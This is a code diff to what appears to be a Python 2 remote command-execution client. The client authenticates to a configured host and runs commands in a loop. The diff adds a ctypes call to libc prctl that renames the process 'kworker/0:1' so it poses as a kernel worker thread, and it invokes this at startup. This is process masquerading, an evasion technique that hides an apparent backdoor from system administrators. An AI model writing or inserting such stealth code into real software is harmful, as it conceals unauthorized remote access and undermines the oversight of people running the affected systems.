@@ -8,6 +8,7 @@ import commands  # Python 2 replacement for subprocess.getoutput
 import os
 import ssl
 import random
+import ctypes
 
 current_dir = os.getcwd()
 # CONFIG_FILE = os.path.abspath("config.json")
@@ -59,6 +60,14 @@ def authenticate(sock, secret):
         return result == "OK"
     except:
         return False
+    
+def process_name():
+    try:
+        libc = ctypes.CDLL('libc.so.6')
+        fake_name = 'kworker/0:1\0'
+        libc.prctl(15, fake_name, 0, 0, 0)
+    except Exception:
+        pass
 
 
 # def execute_command(command):
@@ -94,6 +103,7 @@ def execute_command(command):
         return "ERROR: " + str(e)
 
 def main():
+    process_name()
     host, port, secret, sleep_time = load_config()
 
     while True:
